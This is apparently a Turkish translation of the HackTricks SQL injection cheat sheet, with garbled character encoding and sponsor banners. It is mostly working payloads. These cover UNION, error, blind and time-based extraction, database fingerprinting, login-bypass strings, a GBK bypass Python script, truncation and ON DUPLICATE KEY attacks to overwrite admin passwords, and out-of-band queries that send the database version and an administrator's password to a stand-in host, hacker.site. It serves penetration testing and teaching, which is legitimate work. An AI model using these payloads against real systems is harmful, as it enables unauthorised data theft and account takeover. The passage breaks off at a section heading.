# SQL Injection

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

â€‹â€‹â€‹â€‹[**RootedCON**](https://www.rootedcon.com/) **Ä°spanya**'daki en Ã¶nemli siber gÃ¼venlik etkinliÄŸi ve **Avrupa**'daki en Ã¶nemli etkinliklerden biridir. **Teknik bilgiyi teÅŸvik etme misyonu** ile bu kongre, her disiplindeki teknoloji ve siber gÃ¼venlik profesyonelleri iÃ§in kaynayan bir buluÅŸma noktasÄ±dÄ±r.

{% embed url="https://www.rootedcon.com/" %}

## SQL enjeksiyonu nedir?

**SQL enjeksiyonu**, saldÄ±rganlarÄ±n bir uygulamanÄ±n **veritabanÄ± sorgularÄ±yla etkileÅŸimde bulunmasÄ±na** olanak tanÄ±yan bir gÃ¼venlik aÃ§Ä±ÄŸÄ±dÄ±r. Bu zafiyet, saldÄ±rganlarÄ±n **gÃ¶rmesine**, **deÄŸiÅŸtirmesine** veya **silmesine** izin verebilir; bu, diÄŸer kullanÄ±cÄ±larÄ±n bilgileri veya uygulamanÄ±n eriÅŸebileceÄŸi herhangi bir veri dahil olmak Ã¼zere, eriÅŸmemeleri gereken verilere eriÅŸim saÄŸlar. Bu tÃ¼r eylemler, uygulamanÄ±n iÅŸlevselliÄŸinde veya iÃ§eriÄŸinde kalÄ±cÄ± deÄŸiÅŸikliklere veya hatta sunucunun tehlikeye girmesine veya hizmetin reddine yol aÃ§abilir.


## GiriÅŸ noktasÄ± tespiti

Bir sitenin, SQLi ile ilgili girdilere alÄ±ÅŸÄ±lmadÄ±k sunucu yanÄ±tlarÄ± nedeniyle **SQL enjeksiyonuna (SQLi)** **duyarlÄ±** olduÄŸu gÃ¶rÃ¼nÃ¼yorsa, **ilk adÄ±m**, **sorguya veri enjekte etmenin** ve bunu bozmadan yapmanÄ±n yolunu anlamaktÄ±r. Bu, mevcut baÄŸlamdan **etkili bir ÅŸekilde kaÃ§Ä±ÅŸ** yÃ¶ntemini belirlemeyi gerektirir. Ä°ÅŸte bazÄ± faydalÄ± Ã¶rnekler:
```
[Nothing]
'
"
`
')
")
`)
'))
"))
`))
```
Sonra, **sorguyu hatasÄ±z hale getirmeyi** bilmeniz gerekiyor. Sorguyu dÃ¼zeltmek iÃ§in **veri girebilir** ve **Ã¶nceki sorgunun yeni veriyi kabul etmesini** saÄŸlayabilirsiniz veya sadece **verinizi girebilir** ve **sonuna bir yorum sembolÃ¼ ekleyebilirsiniz**.

_Hata mesajlarÄ±nÄ± gÃ¶rebiliyorsanÄ±z veya bir sorgunun Ã§alÄ±ÅŸtÄ±ÄŸÄ±nda ve Ã§alÄ±ÅŸmadÄ±ÄŸÄ±nda farklÄ±lÄ±klarÄ± fark edebiliyorsanÄ±z, bu aÅŸama daha kolay olacaktÄ±r._

### **Yorumlar**
```sql
MySQL
#comment
-- comment     [Note the space after the double dash]
/*comment*/
/*! MYSQL Special SQL */

PostgreSQL
--comment
/*comment*/

MSQL
--comment
/*comment*/

Oracle
--comment

SQLite
--comment
/*comment*/

HQL
HQL does not support comments
```
### MantÄ±ksal iÅŸlemlerle doÄŸrulama

SQL injection zafiyetini doÄŸrulamanÄ±n gÃ¼venilir bir yÃ¶ntemi, bir **mantÄ±ksal iÅŸlem** gerÃ§ekleÅŸtirmek ve beklenen sonuÃ§larÄ± gÃ¶zlemlemektir. Ã–rneÄŸin, `?username=Peter` gibi bir GET parametresinin `?username=Peter' or '1'='1` olarak deÄŸiÅŸtirildiÄŸinde aynÄ± iÃ§eriÄŸi vermesi, bir SQL injection zafiyetini gÃ¶sterir.

Benzer ÅŸekilde, **matematiksel iÅŸlemlerin** uygulanmasÄ± etkili bir doÄŸrulama tekniÄŸi olarak hizmet eder. Ã–rneÄŸin, `?id=1` ve `?id=2-1` eriÅŸimlerinin aynÄ± sonucu vermesi, SQL injection'Ä± gÃ¶sterir.

MantÄ±ksal iÅŸlem doÄŸrulamasÄ±nÄ± gÃ¶steren Ã¶rnekler:
```
page.asp?id=1 or 1=1 -- results in true
page.asp?id=1' or 1=1 -- results in true
page.asp?id=1" or 1=1 -- results in true
page.asp?id=1 and 1=2 -- results in false
```
Bu kelime listesi, Ã¶nerilen ÅŸekilde **SQL enjeksiyonlarÄ±nÄ±** **doÄŸrulamak** iÃ§in oluÅŸturulmuÅŸtur:

{% file src="../../.gitbook/assets/sqli-logic.txt" %}

### Zaman ile DoÄŸrulama

BazÄ± durumlarda, test ettiÄŸiniz sayfada **hiÃ§bir deÄŸiÅŸiklik fark etmeyeceksiniz**. Bu nedenle, **kÃ¶r SQL enjeksiyonlarÄ±nÄ±** keÅŸfetmenin iyi bir yolu, veritabanÄ±nÄ±n iÅŸlemler yapmasÄ±nÄ± saÄŸlamak ve bu iÅŸlemlerin sayfanÄ±n yÃ¼klenme sÃ¼resi Ã¼zerinde **etkisi** olacaktÄ±r.\
Bu nedenle, SQL sorgusuna tamamlanmasÄ± uzun sÃ¼recek bir iÅŸlemi birleÅŸtireceÄŸiz:
```
MySQL (string concat and logical ops)
1' + sleep(10)
1' and sleep(10)
1' && sleep(10)
1' | sleep(10)

PostgreSQL (only support string concat)
1' || pg_sleep(10)

MSQL
1' WAITFOR DELAY '0:0:10'

Oracle
1' AND [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME])
1' AND 123=DBMS_PIPE.RECEIVE_MESSAGE('ASD',10)

SQLite
1' AND [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))
1' AND 123=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
```
BazÄ± durumlarda **sleep fonksiyonlarÄ±na izin verilmeyecek**. O zaman, bu fonksiyonlarÄ± kullanmak yerine, sorgunun **karmaÅŸÄ±k iÅŸlemler gerÃ§ekleÅŸtirmesini** saÄŸlayabilirsiniz. _Bu tekniklerin Ã¶rnekleri her teknoloji iÃ§in ayrÄ± ayrÄ± yorumlanacaktÄ±r (varsa)_.

### Arka UÃ§ Belirleme

Arka ucu belirlemenin en iyi yolu, farklÄ± arka uÃ§larÄ±n fonksiyonlarÄ±nÄ± Ã§alÄ±ÅŸtÄ±rmaya Ã§alÄ±ÅŸmaktÄ±r. Ã–nceki bÃ¶lÃ¼mdeki _**sleep**_ **fonksiyonlarÄ±nÄ±** veya bu fonksiyonlarÄ± kullanabilirsiniz (tablo [payloadsallthethings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#dbms-identification):
```bash
["conv('a',16,2)=conv('a',16,2)"                   ,"MYSQL"],
["connection_id()=connection_id()"                 ,"MYSQL"],
["crc32('MySQL')=crc32('MySQL')"                   ,"MYSQL"],
["BINARY_CHECKSUM(123)=BINARY_CHECKSUM(123)"       ,"MSSQL"],
["@@CONNECTIONS>0"                                 ,"MSSQL"],
["@@CONNECTIONS=@@CONNECTIONS"                     ,"MSSQL"],
["@@CPU_BUSY=@@CPU_BUSY"                           ,"MSSQL"],
["USER_ID(1)=USER_ID(1)"                           ,"MSSQL"],
["ROWNUM=ROWNUM"                                   ,"ORACLE"],
["RAWTOHEX('AB')=RAWTOHEX('AB')"                   ,"ORACLE"],
["LNNVL(0=123)"                                    ,"ORACLE"],
["5::int=5"                                        ,"POSTGRESQL"],
["5::integer=5"                                    ,"POSTGRESQL"],
["pg_client_encoding()=pg_client_encoding()"       ,"POSTGRESQL"],
["get_current_ts_config()=get_current_ts_config()" ,"POSTGRESQL"],
["quote_literal(42.5)=quote_literal(42.5)"         ,"POSTGRESQL"],
["current_database()=current_database()"           ,"POSTGRESQL"],
["sqlite_version()=sqlite_version()"               ,"SQLITE"],
["last_insert_rowid()>1"                           ,"SQLITE"],
["last_insert_rowid()=last_insert_rowid()"         ,"SQLITE"],
["val(cvar(1))=1"                                  ,"MSACCESS"],
["IIF(ATN(2)>0,1,0) BETWEEN 2 AND 0"               ,"MSACCESS"],
["cdbl(1)=cdbl(1)"                                 ,"MSACCESS"],
["1337=1337",   "MSACCESS,SQLITE,POSTGRESQL,ORACLE,MSSQL,MYSQL"],
["'i'='i'",     "MSACCESS,SQLITE,POSTGRESQL,ORACLE,MSSQL,MYSQL"],
```
AyrÄ±ca, sorgunun Ã§Ä±ktÄ±sÄ±na eriÅŸiminiz varsa, **veritabanÄ±nÄ±n sÃ¼rÃ¼mÃ¼nÃ¼ yazdÄ±rmasÄ±nÄ±** saÄŸlayabilirsiniz.

{% hint style="info" %}
DevamÄ±nda, farklÄ± SQL Injection tÃ¼rlerini istismar etmenin Ã§eÅŸitli yÃ¶ntemlerini tartÄ±ÅŸacaÄŸÄ±z. Ã–rnek olarak MySQL kullanacaÄŸÄ±z.
{% endhint %}

### PortSwigger ile TanÄ±mlama

{% embed url="https://portswigger.net/web-security/sql-injection/cheat-sheet" %}

## Union TabanlÄ± Ä°stismar

### SÃ¼tun sayÄ±sÄ±nÄ± tespit etme

Sorgunun Ã§Ä±ktÄ±sÄ±nÄ± gÃ¶rebiliyorsanÄ±z, bunu istismar etmenin en iyi yoludur.\
Ã–ncelikle, **ilk isteÄŸin** dÃ¶ndÃ¼rdÃ¼ÄŸÃ¼ **sÃ¼tunlarÄ±n sayÄ±sÄ±nÄ±** bulmamÄ±z gerekiyor. Bunun nedeni, **her iki sorgunun da aynÄ± sayÄ±da sÃ¼tun dÃ¶ndÃ¼rmesi gerektiÄŸidir**.\
Bu amaÃ§la genellikle iki yÃ¶ntem kullanÄ±lÄ±r:

#### Order/Group by

Bir sorgudaki sÃ¼tun sayÄ±sÄ±nÄ± belirlemek iÃ§in, **ORDER BY** veya **GROUP BY** ifadelerinde kullanÄ±lan sayÄ±yÄ± kademeli olarak artÄ±rarak yanlÄ±ÅŸ bir yanÄ±t alÄ±nana kadar ayarlayÄ±n. SQL iÃ§indeki **GROUP BY** ve **ORDER BY**'nÄ±n farklÄ± iÅŸlevlerine raÄŸmen, her ikisi de sorgunun sÃ¼tun sayÄ±sÄ±nÄ± belirlemek iÃ§in aynÄ± ÅŸekilde kullanÄ±labilir.
```sql
1' ORDER BY 1--+    #True
1' ORDER BY 2--+    #True
1' ORDER BY 3--+    #True
1' ORDER BY 4--+    #False - Query is only using 3 columns
#-1' UNION SELECT 1,2,3--+    True
```

```sql
1' GROUP BY 1--+    #True
1' GROUP BY 2--+    #True
1' GROUP BY 3--+    #True
1' GROUP BY 4--+    #False - Query is only using 3 columns
#-1' UNION SELECT 1,2,3--+    True
```
#### UNION SELECT

Sorgu doÄŸru olana kadar daha fazla null deÄŸeri seÃ§in:
```sql
1' UNION SELECT null-- - Not working
1' UNION SELECT null,null-- - Not working
1' UNION SELECT null,null,null-- - Worked
```
_`null` deÄŸerlerini kullanmalÄ±sÄ±nÄ±z Ã§Ã¼nkÃ¼ bazÄ± durumlarda sorgunun her iki tarafÄ±ndaki sÃ¼tunlarÄ±n tÃ¼rÃ¼ aynÄ± olmalÄ±dÄ±r ve null her durumda geÃ§erlidir._

### VeritabanÄ± adlarÄ±nÄ±, tablo adlarÄ±nÄ± ve sÃ¼tun adlarÄ±nÄ± Ã§Ä±karÄ±n

Sonraki Ã¶rneklerde, tÃ¼m veritabanlarÄ±nÄ±n adÄ±nÄ±, bir veritabanÄ±nÄ±n tablo adÄ±nÄ± ve tablonun sÃ¼tun adlarÄ±nÄ± alacaÄŸÄ±z:
```sql
#Database names
-1' UniOn Select 1,2,gRoUp_cOncaT(0x7c,schema_name,0x7c) fRoM information_schema.schemata

#Tables of a database
-1' UniOn Select 1,2,3,gRoUp_cOncaT(0x7c,table_name,0x7C) fRoM information_schema.tables wHeRe table_schema=[database]

#Column names
-1' UniOn Select 1,2,3,gRoUp_cOncaT(0x7c,column_name,0x7C) fRoM information_schema.columns wHeRe table_name=[table name]
```
_Her farklÄ± veritabanÄ±nda bu verileri keÅŸfetmenin farklÄ± bir yolu vardÄ±r, ancak metodoloji her zaman aynÄ±dÄ±r._

## Gizli BirleÅŸim TabanlÄ± SÃ¶mÃ¼rme

Bir sorgunun Ã§Ä±ktÄ±sÄ± gÃ¶rÃ¼nÃ¼rken, ancak birleÅŸim tabanlÄ± bir enjeksiyon mÃ¼mkÃ¼n gÃ¶rÃ¼nmÃ¼yorsa, bu **gizli birleÅŸim tabanlÄ± enjeksiyon** varlÄ±ÄŸÄ±nÄ± gÃ¶sterir. Bu senaryo genellikle kÃ¶r enjeksiyon durumuna yol aÃ§ar. KÃ¶r enjeksiyonu birleÅŸim tabanlÄ± bir hale dÃ¶nÃ¼ÅŸtÃ¼rmek iÃ§in, arka plandaki yÃ¼rÃ¼tme sorgusunun anlaÅŸÄ±lmasÄ± gerekir.

Bu, hedef VeritabanÄ± YÃ¶netim Sistemi (DBMS) iÃ§in varsayÄ±lan tablolarla birlikte kÃ¶r enjeksiyon tekniklerinin kullanÄ±lmasÄ±yla gerÃ§ekleÅŸtirilebilir. Bu varsayÄ±lan tablolarÄ± anlamak iÃ§in, hedef DBMS'nin belgelerine baÅŸvurulmasÄ± Ã¶nerilir.

Sorgu Ã§Ä±karÄ±ldÄ±ktan sonra, orijinal sorguyu gÃ¼venli bir ÅŸekilde kapatacak ÅŸekilde yÃ¼kÃ¼nÃ¼zÃ¼ Ã¶zelleÅŸtirmeniz gerekmektedir. ArdÄ±ndan, yÃ¼kÃ¼nÃ¼ze bir birleÅŸim sorgusu eklenir ve bu, yeni eriÅŸilebilir birleÅŸim tabanlÄ± enjeksiyonun sÃ¶mÃ¼rÃ¼lmesini kolaylaÅŸtÄ±rÄ±r.

Daha kapsamlÄ± bilgiler iÃ§in [KÃ¶r EnjeksiyonlarÄ± Ä°yileÅŸtirme](https://medium.com/@Rend_/healing-blind-injections-df30b9e0e06f) baÅŸlÄ±klÄ± makaleye baÅŸvurun.

## Hata TabanlÄ± SÃ¶mÃ¼rme

EÄŸer bir sebepten dolayÄ± **sorgunun** **Ã§Ä±kÄ±ÅŸÄ±nÄ±** gÃ¶remiyorsanÄ±z ama **hata mesajlarÄ±nÄ±** gÃ¶rebiliyorsanÄ±z, bu hata mesajlarÄ±nÄ± veritabanÄ±ndan **veri sÄ±zdÄ±rmak** iÃ§in kullanabilirsiniz.\
BirleÅŸim TabanlÄ± sÃ¶mÃ¼rÃ¼deki benzer bir akÄ±ÅŸÄ± takip ederek veritabanÄ±nÄ± dÃ¶kme iÅŸlemini gerÃ§ekleÅŸtirebilirsiniz.
```sql
(select 1 and row(1,1)>(select count(*),concat(CONCAT(@@VERSION),0x3a,floor(rand()*2))x from (select 1 union select 2)a group by x limit 1))
```
## Blind SQLi'yi Ä°stismar Etme

Bu durumda sorgunun sonuÃ§larÄ±nÄ± veya hatalarÄ± gÃ¶remezsiniz, ancak sorgunun **doÄŸru** veya **yanlÄ±ÅŸ** bir yanÄ±t dÃ¶ndÃ¼rdÃ¼ÄŸÃ¼nÃ¼ **ayÄ±rdedebilirsiniz** Ã§Ã¼nkÃ¼ sayfada farklÄ± iÃ§erikler vardÄ±r.\
Bu durumda, veritabanÄ±nÄ± karakter karakter dÃ¶kmek iÃ§in bu davranÄ±ÅŸÄ± kÃ¶tÃ¼ye kullanabilirsiniz:
```sql
?id=1 AND SELECT SUBSTR(table_name,1,1) FROM information_schema.tables = 'A'
```
## Hata KÃ¶r SQLi SÃ¶mÃ¼rÃ¼sÃ¼

Bu, **Ã¶nceki durumla aynÄ±** ama sorgudan gelen doÄŸru/yanlÄ±ÅŸ yanÄ±tÄ± ayÄ±rt etmek yerine, SQL sorgusundaki bir **hata** olup olmadÄ±ÄŸÄ±nÄ± ayÄ±rt edebilirsiniz (belki HTTP sunucusu Ã§Ã¶kÃ¼yor). Bu nedenle, bu durumda doÄŸru karakteri her tahmin ettiÄŸinizde bir SQL hatasÄ± zorlayabilirsiniz:
```sql
AND (SELECT IF(1,(SELECT table_name FROM information_schema.tables),'a'))-- -
```
## Zaman TabanlÄ± SQLi Ä°stismar Etme

Bu durumda, sayfanÄ±n baÄŸlamÄ±na dayalÄ± olarak sorgunun **yanÄ±tÄ±nÄ±** **ayÄ±rmanÄ±n** herhangi bir yolu **yoktur**. Ancak, tahmin edilen karakter doÄŸruysa sayfanÄ±n **yÃ¼klenme sÃ¼resini uzatmasÄ±nÄ±** saÄŸlayabilirsiniz. Bu tekniÄŸi daha Ã¶nce [SQLi zafiyetini doÄŸrulamak iÃ§in](./#confirming-with-timing) kullanÄ±rken gÃ¶rdÃ¼k.
```sql
1 and (select sleep(10) from users where SUBSTR(table_name,1,1) = 'A')#
```
## Stacked Queries

Stacked sorgularÄ± kullanarak **birden fazla sorguyu peÅŸ peÅŸe Ã§alÄ±ÅŸtÄ±rabilirsiniz**. Sonraki sorgular Ã§alÄ±ÅŸtÄ±rÄ±lÄ±rken, **sonuÃ§lar** **uygulamaya** **geri dÃ¶ndÃ¼rÃ¼lmez**. Bu nedenle, bu teknik esasen **kÃ¶r zafiyetler** ile ilgilidir; burada ikinci bir sorgu kullanarak bir DNS sorgusu, koÅŸullu hata veya zaman gecikmesi tetikleyebilirsiniz.

**Oracle** **stacked queries**'i desteklemez. **MySQL, Microsoft** ve **PostgreSQL** destekler: `QUERY-1-HERE; QUERY-2-HERE`

## Out of band Exploitation

EÄŸer **baÅŸka** bir istismar yÃ¶ntemi **Ã§alÄ±ÅŸmadÄ±ysa**, **veritabanÄ±nÄ±n** bilgiyi sizin kontrolÃ¼nÃ¼zdeki **harici bir hosta** sÄ±zdÄ±rmasÄ±nÄ± saÄŸlamayÄ± deneyebilirsiniz. Ã–rneÄŸin, DNS sorgularÄ± aracÄ±lÄ±ÄŸÄ±yla:
```sql
select load_file(concat('\\\\',version(),'.hacker.site\\a.txt'));
```
### XXE aracÄ±lÄ±ÄŸÄ±yla bant dÄ±ÅŸÄ± veri sÄ±zdÄ±rma
```sql
a' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.hacker.site/"> %remote;]>'),'/l') FROM dual-- -
```
## Otomatik SÃ¶mÃ¼rÃ¼

Bir SQLi zafiyetini [**sqlmap**](https://github.com/sqlmapproject/sqlmap) ile sÃ¶mÃ¼rmek iÃ§in [SQLMap Cheatsheet](sqlmap/) dosyasÄ±nÄ± kontrol edin.

## Teknolojiye Ã¶zel bilgiler

Bir SQL Injection zafiyetini sÃ¶mÃ¼rmenin tÃ¼m yollarÄ±nÄ± zaten tartÄ±ÅŸtÄ±k. Bu kitapta veritabanÄ± teknolojisine baÄŸlÄ± daha fazla ipucu bulabilirsiniz:

* [MS Access](ms-access-sql-injection.md)
* [MSSQL](mssql-injection.md)
* [MySQL](mysql-injection/)
* [Oracle](oracle-injection.md)
* [PostgreSQL](postgresql-injection/)

Ya da **MySQL, PostgreSQL, Oracle, MSSQL, SQLite ve HQL ile ilgili birÃ§ok ipucu** bulacaksÄ±nÄ±z [**https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection**](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

â€‹â€‹â€‹â€‹â€‹[**RootedCON**](https://www.rootedcon.com/) **Ä°spanya**'daki en ilgili siber gÃ¼venlik etkinliÄŸi ve **Avrupa**'daki en Ã¶nemli etkinliklerden biridir. **Teknik bilgiyi teÅŸvik etme misyonu** ile bu kongre, her disiplinde teknoloji ve siber gÃ¼venlik profesyonelleri iÃ§in kaynayan bir buluÅŸma noktasÄ±dÄ±r.

{% embed url="https://www.rootedcon.com/" %}

## Kimlik DoÄŸrulama Atlatma

GiriÅŸ iÅŸlevini atlatmaya Ã§alÄ±ÅŸmak iÃ§in liste:

{% content-ref url="../login-bypass/sql-login-bypass.md" %}
[sql-login-bypass.md](../login-bypass/sql-login-bypass.md)
{% endcontent-ref %}

### Ham hash kimlik doÄŸrulama Atlatma
```sql
"SELECT * FROM admin WHERE pass = '".md5($password,true)."'"
```
Bu sorgu, kimlik doÄŸrulama kontrollerinde ham Ã§Ä±ktÄ± iÃ§in true ile MD5 kullanÄ±ldÄ±ÄŸÄ±nda bir gÃ¼venlik aÃ§Ä±ÄŸÄ±nÄ± sergilemektedir ve sistemi SQL injection'a karÅŸÄ± savunmasÄ±z hale getirmektedir. SaldÄ±rganlar, hash'lenildiÄŸinde beklenmedik SQL komut parÃ§alarÄ± Ã¼reten girdiler oluÅŸturarak bunu istismar edebilir ve yetkisiz eriÅŸim saÄŸlayabilir.
```sql
md5("ffifdyop", true) = 'or'6ï¿½]ï¿½ï¿½!r,ï¿½ï¿½bï¿½
sha1("3fDf ", true) = Qï¿½u'='ï¿½@ï¿½[ï¿½tï¿½- oï¿½ï¿½_-!
```
### Enjekte EdilmiÅŸ Hash Kimlik DoÄŸrulama Atlatma
```sql
admin' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055'
```
**Ã–nerilen liste**:

KullanÄ±cÄ± adÄ± olarak listenin her bir satÄ±rÄ±nÄ± ve ÅŸifre olarak her zaman: _**Pass1234.**_ kullanmalÄ±sÄ±nÄ±z.\
_(Bu yÃ¼kler, bu bÃ¶lÃ¼mÃ¼n baÅŸÄ±nda bahsedilen bÃ¼yÃ¼k listede de bulunmaktadÄ±r)_

{% file src="../../.gitbook/assets/sqli-hashbypass.txt" %}

### GBK Kimlik DoÄŸrulama Atlatma

EÄŸer ' kaÃ§Ä±ÅŸ karakteri ile iÅŸleniyorsa %A8%27 kullanabilirsiniz ve ' kaÃ§Ä±ÅŸ karakteri ile iÅŸlendiÄŸinde ÅŸu ÅŸekilde oluÅŸturulacaktÄ±r: 0xA80x5c0x27 (_â•˜'_)
```sql
%A8%27 OR 1=1;-- 2
%8C%A8%27 OR 1=1-- 2
%bf' or 1=1 -- --
```
Python betiÄŸi:
```python
import requests
url = "http://example.com/index.php"
cookies = dict(PHPSESSID='4j37giooed20ibi12f3dqjfbkp3')
datas = {"login": chr(0xbf) + chr(0x27) + "OR 1=1 #", "password":"test"}
r = requests.post(url, data = datas, cookies=cookies, headers={'referrer':url})
print r.text
```
### Polyglot injection (multicontext)
```sql
SLEEP(1) /*' or SLEEP(1) or '" or SLEEP(1) or "*/
```
## Insert Statement

### Mevcut nesne/kullanÄ±cÄ±nÄ±n ÅŸifresini deÄŸiÅŸtirme

Bunu yapmak iÃ§in **"ana nesne"** olarak adlandÄ±rÄ±lan **yeni bir nesne oluÅŸturmayÄ±** denemelisiniz (kullanÄ±cÄ±lar iÃ§in muhtemelen **admin**):

* AdÄ± olan kullanÄ±cÄ± oluÅŸturun: **AdMIn** (bÃ¼yÃ¼k & kÃ¼Ã§Ã¼k harfler)
* AdÄ± olan bir kullanÄ±cÄ± oluÅŸturun: **admin=**
* **SQL Truncation Attack** (kullanÄ±cÄ± adÄ± veya e-posta iÃ§in bazÄ± tÃ¼rde **uzunluk sÄ±nÄ±rÄ±** olduÄŸunda) --> AdÄ± olan kullanÄ±cÄ± oluÅŸturun: **admin \[bir sÃ¼rÃ¼ boÅŸluk] a**

#### SQL Truncation Attack

EÄŸer veritabanÄ± savunmasÄ±zsa ve kullanÄ±cÄ± adÄ± iÃ§in maksimum karakter sayÄ±sÄ± Ã¶rneÄŸin 30 ise ve **admin** kullanÄ±cÄ±sÄ±nÄ± taklit etmek istiyorsanÄ±z, "_admin \[30 boÅŸluk] a_" adÄ±nda bir kullanÄ±cÄ± adÄ± oluÅŸturmaya Ã§alÄ±ÅŸÄ±n ve herhangi bir ÅŸifre belirleyin.

VeritabanÄ±, girilen **kullanÄ±cÄ± adÄ±nÄ±n** veritabanÄ±nda **var olup olmadÄ±ÄŸÄ±nÄ±** **kontrol edecektir**. EÄŸer **yoksa**, **kullanÄ±cÄ± adÄ±nÄ±** **izin verilen maksimum karakter sayÄ±sÄ±na** (bu durumda: "_admin \[25 boÅŸluk]_") **kesecek** ve ardÄ±ndan veritabanÄ±nda kullanÄ±cÄ±yÄ± "**admin**" **yeni ÅŸifreyle** gÃ¼ncelleyerek **sonundaki tÃ¼m boÅŸluklarÄ± otomatik olarak kaldÄ±racaktÄ±r** (bazÄ± hatalar ortaya Ã§Ä±kabilir ama bu, iÅŸlemin Ã§alÄ±ÅŸmadÄ±ÄŸÄ± anlamÄ±na gelmez).

Daha fazla bilgi: [https://blog.lucideus.com/2018/03/sql-truncation-attack-2018-lucideus.html](https://blog.lucideus.com/2018/03/sql-truncation-attack-2018-lucideus.html) & [https://resources.infosecinstitute.com/sql-truncation-attack/#gref](https://resources.infosecinstitute.com/sql-truncation-attack/#gref)

_Not: Bu saldÄ±rÄ±, en son MySQL kurulumlarÄ±nda yukarÄ±da aÃ§Ä±klandÄ±ÄŸÄ± gibi artÄ±k Ã§alÄ±ÅŸmayacaktÄ±r. KarÅŸÄ±laÅŸtÄ±rmalar varsayÄ±lan olarak son boÅŸluklarÄ± hala gÃ¶z ardÄ± etse de, bir alanÄ±n uzunluÄŸundan daha uzun bir dize eklemeye Ã§alÄ±ÅŸmak bir hataya yol aÃ§acak ve ekleme baÅŸarÄ±sÄ±z olacaktÄ±r. Bu kontrol hakkÄ±nda daha fazla bilgi iÃ§in: [https://heinosass.gitbook.io/leet-sheet/web-app-hacking/exploitation/interesting-outdated-attacks/sql-truncation](https://heinosass.gitbook.io/leet-sheet/web-app-hacking/exploitation/interesting-outdated-attacks/sql-truncation)_

### MySQL Ekleme zaman tabanlÄ± kontrol

VALUES ifadesinden Ã§Ä±kmak iÃ§in dÃ¼ÅŸÃ¼ndÃ¼ÄŸÃ¼nÃ¼z kadar `','',''` ekleyin. Gecikme gerÃ§ekleÅŸirse, bir SQLInjection'a sahipsiniz.
```sql
name=','');WAITFOR%20DELAY%20'0:0:5'--%20-
```
### ON DUPLICATE KEY UPDATE

MySQL'deki `ON DUPLICATE KEY UPDATE` ifadesi, UNIQUE indeks veya PRIMARY KEY'de bir tekrar eden deÄŸer oluÅŸturacak ÅŸekilde bir satÄ±r eklenmeye Ã§alÄ±ÅŸÄ±ldÄ±ÄŸÄ±nda veritabanÄ±nÄ±n alacaÄŸÄ± eylemleri belirtmek iÃ§in kullanÄ±lÄ±r. AÅŸaÄŸÄ±daki Ã¶rnek, bu Ã¶zelliÄŸin bir yÃ¶netici hesabÄ±nÄ±n ÅŸifresini deÄŸiÅŸtirmek iÃ§in nasÄ±l istismar edilebileceÄŸini gÃ¶stermektedir:

Ã–rnek YÃ¼k Enjeksiyonu:

Bir enjeksiyon yÃ¼kÃ¼ ÅŸu ÅŸekilde oluÅŸturulabilir; burada `users` tablosuna iki satÄ±r eklenmeye Ã§alÄ±ÅŸÄ±lmaktadÄ±r. Ä°lk satÄ±r bir aldatmaca, ikinci satÄ±r ise mevcut bir yÃ¶neticinin e-posta adresini hedef alarak ÅŸifreyi gÃ¼ncellemeyi amaÃ§lamaktadÄ±r:
```sql
INSERT INTO users (email, password) VALUES ("generic_user@example.com", "bcrypt_hash_of_newpassword"), ("admin_generic@example.com", "bcrypt_hash_of_newpassword") ON DUPLICATE KEY UPDATE password="bcrypt_hash_of_newpassword" -- ";
```
Here's how it works:

- Sorgu, `generic_user@example.com` iÃ§in bir ve `admin_generic@example.com` iÃ§in baÅŸka bir satÄ±r eklemeye Ã§alÄ±ÅŸÄ±r.
- EÄŸer `admin_generic@example.com` iÃ§in satÄ±r zaten mevcutsa, `ON DUPLICATE KEY UPDATE` ifadesi tetiklenir ve MySQL'e mevcut satÄ±rÄ±n `password` alanÄ±nÄ± "bcrypt_hash_of_newpassword" olarak gÃ¼ncellemesi talimatÄ± verilir.
- SonuÃ§ olarak, `admin_generic@example.com` ile bcrypt hash'ine karÅŸÄ±lÄ±k gelen ÅŸifre ile kimlik doÄŸrulama yapÄ±lmaya Ã§alÄ±ÅŸÄ±labilir ("bcrypt_hash_of_newpassword" yeni ÅŸifrenin bcrypt hash'ini temsil eder, bu da istenen ÅŸifrenin gerÃ§ek hash'i ile deÄŸiÅŸtirilmelidir).

### Extract information

#### AynÄ± anda 2 hesap oluÅŸturma

